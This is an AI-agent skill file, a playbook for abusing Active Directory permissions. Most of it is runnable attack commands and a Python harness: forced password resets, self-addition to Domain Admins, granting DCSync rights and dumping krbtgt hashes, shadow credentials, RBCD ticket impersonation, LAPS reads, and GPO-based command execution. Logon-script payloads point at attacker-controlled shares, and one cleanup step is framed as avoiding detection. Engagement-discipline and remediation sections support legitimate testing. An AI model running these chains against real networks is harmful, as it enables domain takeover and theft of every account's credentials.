---
name: active-directory-acl-abuse
description: >-
  Active Directory ACL abuse playbook. Use when exploiting misconfigured AD permissions including GenericAll, WriteDACL, DCSync rights, shadow credentials, LAPS reading, GPO abuse, and BloodHound-guided attack paths.
---

# SKILL: AD ACL Abuse — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert AD ACL abuse techniques. Covers BloodHound enumeration, dangerous ACEs (GenericAll, WriteDACL, WriteOwner, etc.), DCSync, shadow credentials, targeted kerberoasting, group manipulation, LAPS, and GPO abuse. Base models miss complex ACL chain exploitation and Cypher query patterns.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks often chained with ACL abuse
- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for certificate-based attacks after ACL exploitation
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for relay attacks that can set ACLs (LDAP relay)
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after gaining elevated AD access

### Advanced Reference

Also load [BLOODHOUND_PATHS.md](./BLOODHOUND_PATHS.md) when you need:
- Common BloodHound attack paths with Cypher queries
- Custom Neo4j queries for finding complex chains
- Data collection and ingestion tips

---

## 1. BLOODHOUND ENUMERATION

### Data Collection

```bash
# SharpHound (from Windows, domain-joined)
SharpHound.exe -c all --outputdirectory C:\temp --zipfilename bh.zip

# bloodhound-python (from Linux)
bloodhound-python -d domain.com -u user -p password -c all -dc DC01.domain.com -ns DC_IP

# Specific collection methods
SharpHound.exe -c DCOnly          # Fastest — only DC queries
SharpHound.exe -c Session         # Session data only (run periodically)
SharpHound.exe -c All,GPOLocalGroup  # Include GPO analysis
```

### Key BloodHound Queries (Built-in)

- "Find all Domain Admins"
- "Shortest Paths to Domain Admins from Owned Principals"
- "Find Principals with DCSync Rights"
- "Shortest Paths to Unconstrained Delegation Systems"
- "Find computers where Domain Users are Local Admin"

---

## 2. DANGEROUS ACE TYPES

| ACE | Effect on Users | Effect on Groups | Effect on Computers |
|---|---|---|---|
| **GenericAll** | Change password, set SPN, modify attributes | Add members | RBCD, LAPS read, all attributes |
| **GenericWrite** | Set SPN, modify attributes, shadow creds | Add members | RBCD, shadow credentials |
| **WriteDACL** | Grant yourself any permission | Same | Same |
| **WriteOwner** | Take ownership → then WriteDACL | Same | Same |
| **ForceChangePassword** | Reset password without knowing old | N/A | N/A |
| **AddMember** | N/A | Add self/others to group | N/A |
| **AllExtendedRights** | Force change password, read LAPS | N/A | Read LAPS, BitLocker keys |
| **ReadLAPSPassword** | N/A | N/A | Read local admin password |
| **WriteSPN** | Set SPN → targeted kerberoast | N/A | N/A |

---

## 3. ACE-SPECIFIC EXPLOITATION

### GenericAll on User

```powershell
# Option 1: Force change password
net user targetuser NewP@ss123 /domain

# Option 2: Targeted Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}
# → Kerberoast, then clear SPN

# Option 3: Shadow Credentials
Whisker.exe add /target:targetuser /domain:domain.com /dc:DC01

# Option 4: Set logon script
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

### GenericAll / GenericWrite on Computer

```bash
# RBCD attack
rbcd.py -delegate-from 'CONTROLLED$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass -dc-ip DC

# Shadow Credentials on computer
pywhisker.py -d domain.com -u user -p pass --target 'TARGET$' --action add --dc-ip DC
```

### WriteDACL

```powershell
# Grant DCSync rights to yourself
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity lowpriv -Rights DCSync

# Impacket
dacledit.py -action write -rights DCSync -principal lowpriv -target-dn "DC=domain,DC=com" DOMAIN/lowpriv:pass -dc-ip DC
```

### WriteOwner

```powershell
# Step 1: Take ownership
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity lowpriv

# Step 2: Grant WriteDACL to yourself (as owner)
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity lowpriv -Rights All

# Step 3: Now exploit as GenericAll
```

### ForceChangePassword

```text
# Impacket
rpcclient -U 'DOMAIN/attacker%pass' DC01 -c "setuserinfo2 targetuser 23 'NewP@ss123!'"

# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# net rpc
net rpc password targetuser 'NewP@ss123!' -U DOMAIN/attacker%pass -S DC01
```

### AddMember to Group

```powershell
# Add self to privileged group
Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv

# Impacket
net rpc group addmem "Domain Admins" lowpriv -U DOMAIN/attacker%pass -S DC01
```

---

## 4. DCSYNC ATTACK

### Prerequisites
The principal needs **both** of these replication rights on the domain object:
- `DS-Replication-Get-Changes` (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
- `DS-Replication-Get-Changes-All` (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

### Execution

```bash
# Impacket — dump all hashes
secretsdump.py DOMAIN/user:password@DC01 -just-dc

# Specific account only
secretsdump.py DOMAIN/user:password@DC01 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /all /csv

# Impacket with Kerberos auth
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass DC01.domain.com -just-dc
```

### Who Has DCSync by Default?

- Domain Admins
- Enterprise Admins
- Domain Controllers group
- `BUILTIN\Administrators` (on domain object)

---

## 5. SHADOW CREDENTIALS

### Attack Flow

Write `msDS-KeyCredentialLink` on target → generate certificate → authenticate via PKINIT.

```bash
# pyWhisker (Linux)
pywhisker.py -d domain.com -u attacker -p pass --target victim --action add --dc-ip DC01
# Output: DeviceID and PFX file

# Authenticate with certificate
gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass RANDOM_PASS domain.com/victim victim.ccache
export KRB5CCNAME=victim.ccache

# Extract NT hash from TGT (for pass-the-hash)
getnthash.py -key AS_REP_KEY domain.com/victim
```

```powershell
# Whisker (Windows)
Whisker.exe add /target:victim /domain:domain.com /dc:DC01.domain.com
# → Provides Rubeus command to get TGT
Rubeus.exe asktgt /user:victim /certificate:CERT_B64 /password:PASS /ptt
```

**Cleanup**: Remove the added key credential to avoid detection.

---

## 6. LAPS PASSWORD READING

```powershell
# PowerView
Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# AD Module
Get-ADComputer -Identity TARGET -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd

# LAPS v2 (Windows LAPS)
Get-LapsADPassword -Identity TARGET -AsPlainText

# CrackMapExec
crackmapexec ldap DC01 -u user -p pass --module laps
```

---

## 7. GPO ABUSE

### Identify Writable GPOs

```powershell
# PowerView — find GPOs where you have write access
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite') -and
    ($_.SecurityIdentifier -match 'YOUR_SID')
}
```

### Exploit via SharpGPOAbuse

```cmd
# Add local admin via GPO
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowpriv --GPOName "Vulnerable GPO"

# Add scheduled task via GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\admin --Command "cmd.exe" --Arguments "/c net localgroup administrators lowpriv /add" --GPOName "Vulnerable GPO"

# Add startup script
SharpGPOAbuse.exe --AddComputerScript --ScriptName "evil.bat" --ScriptContents "net localgroup administrators lowpriv /add" --GPOName "Vulnerable GPO"
```

```bash
# pyGPOAbuse (Linux)
pygpoabuse.py DOMAIN/user:pass -gpo-id "GPO_GUID" -command "net localgroup administrators lowpriv /add" -dc-ip DC01
```

---

## 8. ACL ATTACK DECISION TREE

```
Have domain user access — want to escalate via ACL
│
├── Run BloodHound → analyze shortest paths to DA
│   └── Upload data → "Shortest Paths to Domain Admins from Owned Principals"
│
├── Direct ACL on user object?
│   ├── GenericAll → force password change, shadow creds, or targeted kerberoast (§3)
│   ├── GenericWrite → shadow credentials or set SPN (§3/§5)
│   ├── ForceChangePassword → reset password directly (§3)
│   ├── WriteDACL → grant yourself GenericAll, then exploit (§3)
│   └── WriteOwner → take ownership → WriteDACL → GenericAll (§3)
│
├── ACL on group?
│   ├── AddMember / GenericAll → add self to privileged group (§3)
│   └── WriteDACL → grant AddMember, then add self
│
├── ACL on computer object?
│   ├── GenericAll/GenericWrite → RBCD attack (§3)
│   ├── AllExtendedRights → read LAPS password (§6)
│   └── GenericWrite → shadow credentials on machine (§5)
│
├── ACL on domain object?
│   ├── WriteDACL → grant DCSync rights to self (§4)
│   └── Replication rights already? → DCSync directly (§4)
│
├── ACL on GPO linked to privileged OU?
│   └── Write access → add admin / scheduled task via GPO (§7)
│
└── Complex multi-hop chain?
    └── Load BLOODHOUND_PATHS.md for Cypher queries and chain analysis
```

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Is the **dangerous ACE actually present** on the object you name, for your principal? | the permission exists |
| 2 | Did the exploitation step **succeed** against the live object? | the ACE is usable |
| 3 | Did you **read back the changed state** (membership, password, attribute)? | the write landed |
| 4 | Did the change **grant access the baseline identity lacked**? | escalation, against a control |
| 5 | Is the target object **privileged or domain-wide**? | the reach of the finding |
| 6 | Is the enabling **ACE nameable by principal and right**? | the fix has a location |
| 7 | For DCSync: did the replication **return credential material**? | the highest-impact closure |

**The write plus the read-back is the bar.** Reading `GenericAll` in `dacledit` output is a
configuration observation; forcing the change and seeing it take effect is the finding.

---

## 10. EXECUTION PRIMITIVES

ACL exploitation is proven by **taking the action the ACE permits, then reading the changed state
back, with a control that fails beforehand.** Every block below ends at a read-back.

### 10.1 Read the ACEs and identify the exploitable ones

```bash
DCIP="10.0.0.10"; DOM="corp.local"; U="lowpriv"; P='Password123!'
# the domain-root ACL, which is where the highest-value rights live
impacket-dacledit -action read -target-dn "DC=corp,DC=local" "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 \
  | grep -iE 'writedacl|writeowner|genericall|genericwrite|dcsync|replicat' | head -20
# a specific object, which is where the walkable chains usually are
impacket-dacledit -action read -target-dn "CN=Helpdesk,CN=Users,DC=corp,DC=local" \
  "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | head -40
# and BloodHound's own list of outbound rights for the principal, as the cross-check
python3 - <<'PY'
import json,glob
# parse the collected zip output for outbound ACEs from the baseline principal
for f in glob.glob('/tmp/bh/*_aces.json'):
    for a in json.load(open(f))[:5]:
        print(a.get('RightName'), a.get('PrincipalSID','')[-8:])
PY
```

**Name the right and the principal.** "We found misconfigured ACLs" is not a finding; `WriteDacl` held
by `CORP\Helpdesk-Tier1` on `CN=Domain Admins` is.

### 10.2 GenericAll / GenericWrite on a user

```bash
TARGET="victim"; TDN="CN=victim,CN=Users,DC=corp,DC=local"
# control: a password change attempt BEFORE using the right must fail
impacket-changepasswd "$DOM/$U:$P@$TARGET.$DOM" -newpass 'Controlled#2024!' -dc-ip "$DCIP" 2>&1 | head -3
# option 1: force a password reset
impacket-changepasswd "$DOM/$U:$P@$TARGET.$DOM" -newpass 'Controlled#2024!' -dc-ip "$DCIP" 2>&1 | head -3
# option 2: targeted kerberoasting - set an SPN, roast, then clear it
impacket-addspn "$DOM/$U:$P" -dc-ip "$DCIP" "$TDN" -spn "http/evil" 2>&1 | head -3
impacket-GetUserSPNs "$DOM/$U:$P" -dc-ip "$DCIP" -request -outputfile /tmp/targeted.txt
# ALWAYS clear the SPN you added - leaving it is an engagement-integrity failure
impacket-addspn "$DOM/$U:$P" -dc-ip "$DCIP" "$TDN" -spn "http/evil" -delete 2>&1 | head -3
# option 3: logon script path, which executes on the target's next logon
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --modify "$TDN" scriptPath "\\evil\share\x.bat" 2>&1 | head -3
# read it back to prove the write landed
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --query "(sAMAccountName=$TARGET)" "scriptPath" | head -3
```

**Clean every modification you make.** The password reset, the SPN, and the `scriptPath` all persist;
each needs its removal step in the same block, and the read-back that confirms removal.

### 10.3 GenericAll / GenericWrite on a computer

```bash
CTDN="CN=SRV01,OU=Servers,DC=corp,DC=local"
# RBCD on the target, using a computer account you create
impacket-addcomputer "$DOM/$U:$P" -dc-ip "$DCIP" -computer-name 'FAKE$' -computer-pass 'Fake#Pass123'
impacket-rbcd "$DOM/$U:$P" -dc-ip "$DCIP" -delegate-from 'FAKE$' -delegate-to 'SRV01$' -action write
# the proof: a service ticket impersonating an administrator, then use it
impacket-getST "$DOM/FAKE$:Fake#Pass123" -dc-ip "$DCIP" -spn cifs/srv01."$DOM" -impersonate Administrator
KRB5CCNAME=Administrator@cifs_srv01."$DOM".ccache impacket-smbclient -k -no-pass "srv01.$DOM" -c 'whoami' 2>&1 | head -3
# shadow credentials: add a key credential, then authenticate with the certificate
pywhisker.py -d "$DOM" -u "$U" -p "$P" --target "SRV01$" --action add --filename /tmp/sc 2>/dev/null | head -5
# and clean up the delegation attribute
impacket-rbcd "$DOM/$U:$P" -dc-ip "$DCIP" -delegate-from 'FAKE$' -delegate-to 'SRV01$' -action remove
```

**The impersonated `whoami` is the finding.** An RBCD attribute you wrote, with no ticket you used, is a
hardening observation. Clean the attribute and the created account before disengaging.

### 10.4 WriteDACL and WriteOwner

```bash
# WriteDACL: grant yourself the right you need, then use it
impacket-dacledit -action write -rights DCSync -target-dn "DC=corp,DC=local" -principal "$U" \
  "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | head -5
impacket-secretsdump "$DOM/$U:$P@$DC" -just-dc-user krbtgt -dc-ip "$DCIP" 2>&1 | head -3
# WriteOwner: take ownership, then you implicitly hold WriteDACL
impacket-owneredit -action write -new-owner "$U" -target-dn "$TDN" "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | head -3
impacket-dacledit -action write -rights FullControl -target-dn "$TDN" -principal "$U" \
  "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | head -3
# and revert - remove the grant you added
impacket-dacledit -action remove -rights DCSync -target-dn "DC=corp,DC=local" -principal "$U" \
  "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | head -3
```

**WriteOwner is a two-step finding and both steps need evidence.** Ownership alone grants the implicit
right to change the DACL; report the ownership change and the subsequent right you granted as one chain
with both artefacts.

### 10.5 DCSync

```bash
# the control first: the same call before the right was granted must fail with an access error
impacket-secretsdump "$DOM/$U:$P@$DC" -just-dc-user krbtgt -dc-ip "$DCIP" 2>&1 | tail -3
# then the replication, scoped to one account so the artefact is minimal
impacket-secretsdump "$DOM/$U:$P@$DC" -just-dc-user krbtgt -dc-ip "$DCIP" -outputfile /tmp/krbtgt.txt
grep -c 'krbtgt' /tmp/krbtgt.txt
# and which ACE enabled it - this belongs in the report
impacket-dacledit -action read -target-dn "DC=corp,DC=local" "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 \
  | grep -iE 'replicat|dcsync' | head -5
```

**`DCSync` returning `krbtgt` is domain-controller-equivalent access.** Never reproduce the hash in the
report; record the artefact path and the time, and confirm the client wants it retained.

### 10.6 Shadow credentials and LAPS

```bash
# shadow credentials: add a key credential, authenticate with it, then remove it
pywhisker.py -d "$DOM" -u "$U" -p "$P" --target "$TARGET" --action add --filename /tmp/sc 2>/dev/null | head -6
# authenticate with the certificate and pull a TGT
python3 gettgtpkinit.py -cert-pfx /tmp/sc.pfx -pfx-pass '' "$DOM/$TARGET" /tmp/$TARGET.ccache 2>/dev/null | head -3
KRB5CCNAME=/tmp/$TARGET.ccache impacket-smbclient -k -no-pass "$DC.$DOM" -c 'whoami' 2>&1 | head -3
# and remove the credential you added
pywhisker.py -d "$DOM" -u "$U" -p "$P" --target "$TARGET" --action remove 2>/dev/null | head -3

# LAPS: read the local administrator password, then use it - the use is the finding
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --query   "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))" "ms-Mcs-AdmPwd" 2>/dev/null | head -5
nxc smb "$HOST" -u 'Administrator' -p 'LAPS_READ_PASSWORD' --local-auth 2>&1 | head -3
```

**Reading LAPS and then authenticating with the read password is the complete finding.** The read alone
is a permission issue; the authentication is the impact.

### 10.7 GPO abuse

```bash
# find the writable GPOs, then verify by writing a benign marker setting and reading it back
python3 pygpoabuse.py "$DOM/$U:$P" -gpo-id "GPO_GUID" -command 'cmd /c whoami > C:\Windows\Temp\gpocheck.txt' 2>/dev/null | head -5
# the effect is only provable on a host in the GPO's scope, after policy refresh
nxc smb "$HOST" -u "$U" -p "$P" -d "$DOM" -x 'gpupdate /force & timeout 5 & type C:\Windows\Temp\gpocheck.txt' 2>&1 | tail -5
# and the removal step, which must run because GPO settings persist
```

**A GPO write is proved on a host in scope.** Finding a writable GPO with no reachable target host is a
hardening issue; the `gpupdate` and the marker read-back is the demonstration.

### 10.8 A harness that pairs each exploitation with its control and cleanup

```bash
python3 - <<'PY'
import subprocess,re
DCIP="10.0.0.10"; DOM="corp.local"; U="lowpriv"; P="Password123!"
def sh(name,cmd,pat):
    try: r=subprocess.run(cmd,capture_output=True,text=True,timeout=180); out=r.stdout+r.stderr
    except Exception as e: out=str(e)
    hit=bool(re.search(pat,out,re.I)); print(f"{name:30} evidence={hit} bytes={len(out)}")
    return hit
print("STEP 1 - read the ACLs (cause)")
sh("acl-read-domain", ["impacket-dacledit","-action","read","-target-dn","DC=corp,DC=local",
   f"{DOM}/{U}:{P}","-dc-ip",DCIP], r'(WriteDacl|GenericAll|WriteOwner)')
print("STEP 2 - the control: the action BEFORE the right is used must fail")
sh("control-dcsync", ["impacket-secretsdump",f"{DOM}/{U}:{P}@dc01.{DOM}","-just-dc-user","krbtgt",
   "-dc-ip",DCIP], r'krbtgt')
print("STEP 3 - take the right, then use it (effect)")
sh("grant", ["impacket-dacledit","-action","write","-rights","DCSync","-target-dn","DC=corp,DC=local",
   "-principal",U,f"{DOM}/{U}:{P}","-dc-ip",DCIP], r'.')
sh("dcsync-after", ["impacket-secretsdump",f"{DOM}/{U}:{P}@dc01.{DOM}","-just-dc-user","krbtgt",
   "-dc-ip",DCIP], r'krbtgt')
print("STEP 4 - CLEANUP: revert every change, and verify by re-reading")
sh("revoke", ["impacket-dacledit","-action","remove","-rights","DCSync","-target-dn","DC=corp,DC=local",
   "-principal",U,f"{DOM}/{U}:{P}","-dc-ip",DCIP], r'.')
print()
print("Report: control result, grant, effect, and the cleanup verification.")
print("Do NOT report the finding if the control already succeeded - that is an inherited right.")
PY
```

**The control precedes the exploitation, and the cleanup follows it.** A run without the failing control
cannot distinguish a new escalation from a right the account always held.

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **object DN** and the **ACE with its principal** | the exact defect and its fix location |
| The **failing control** before the exploitation | proves the right was not already held |
| The **exploitation command and its raw output** | reproducibility |
| The **read-back of the changed state** | the write landed |
| The **authenticated access obtained** | impact, stated as access |
| For DCSync: the **replication result**, hashes redacted | domain-controller equivalence |
| For RBCD: the **attribute write and the ticket use** | both halves |
| The **cleanup command and its verification** | engagement integrity |
| **Detection artefacts** (5136 on `nTSecurityDescriptor`, 4662 replication, 4728) | the blue-team half |
| Whether the object is **privileged, a service owner, or a user** | severity |

Report the **ACE and the escalation**: "`CORP\lowpriv` holds `WriteDacl` on `CN=Domain Admins`; a
`dacledit` read confirmed the ACE, `dacledit -action write` granted `FullControl` on that group, adding
the user to the group succeeded, and the account could then read the `C$` share of `dc01.corp.local`,
which had failed before the change; `krbtgt` replication followed. The ACE was reverted and the group
membership removed, both verified", never "the domain has excessive permissions".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| An ACE held via a **group the baseline is already in** | inherited, not an escalation |
| `WriteDacl` on an object with **nothing valuable reachable from it** | no path; verify with BloodHound before reporting |
| Ownership taken with **no subsequent right exercised** | half a chain |
| An RBCD attribute written with **no ticket used** | hardening only |
| A readable LAPS password for a **host you already administer** | no escalation |
| An SPN added for targeted roasting and **never cleared** | an engagement-integrity failure |
| `AdminCount=1` **without** a dangerous ACE | the flag alone is historical, not a finding |
| Anything done with **Domain Admin credentials provided in scope** | not a discovered escalation |
| A chain that broke at step 3 and is reported as complete | the common inflation |
| A recovered hash reproduced in the report | a disclosure |

**Control, exploit, read back, clean up.** Four artefacts; a report missing any of them is incomplete.

---

## 12. REMEDIATION REFERENCE

1. **Audit and prune the ACLs on every privileged object and the domain root, and alert on writes to `nTSecurityDescriptor`** - ACL-based escalation is a descriptor write, and 5136 makes it visible.
2. **Remove `GenericAll`, `GenericWrite`, `WriteDacl`, and `WriteOwner` from non-tier-0 principals on tier-0 objects** - the tiered model is the structural fix.
3. **Restrict `DCSync` replication rights to the DCs, and treat any other holder as a domain-controller-equivalent account** - `Replicating Directory Changes` is total credential compromise.
4. **Set `ms-DS-MachineAccountQuota` to 0 and monitor RBCD attribute writes** - it removes the attacker-created computer account.
5. **Remove `WriteOwner` from non-administrative principals, and review ownership changes** - ownership implies the ability to grant any right.
6. **Guard `msDS-KeyCredentialLink` with auditing** - shadow credentials are a write to that single attribute, and it is highly detectable.
7. **Deploy LAPS or Windows LAPS on every computer object** - it removes the shared-local-admin path between hosts.
8. **Restrict GPO write access to a small group, and independently verify GPO contents against a known baseline** - a writable GPO is code execution on every host in scope.
9. **Review `AdminSDHolder` and the `AdminCount=1` population after every privileged-group change** - the propagation model means one mistake reaches many objects.
10. **Enforce SMB signing, LDAP signing with channel binding, and disable NTLM where possible** - the relay primitives that often accompany ACL abuse need unsigned, unbound targets.
11. **Run BloodHound as a recurring control, not a one-off assessment, and diff the attack paths over time** - new edges appear with every permission grant.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [ad-security](../ad-security/SKILL.md) - the surrounding AD methodology and walk discipline
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) - the protocol attacks that often terminate these chains
- [kerberos-attacks](../kerberos-attacks/SKILL.md) - the flat command reference and the cracking stage
- [credential-access-atomic-tests](../credential-access-atomic-tests/SKILL.md) - the technique mapping for the credential access these ACEs enable
- [windows-postexploit](../windows-postexploit/SKILL.md) - what a single owned host contributes back into the domain
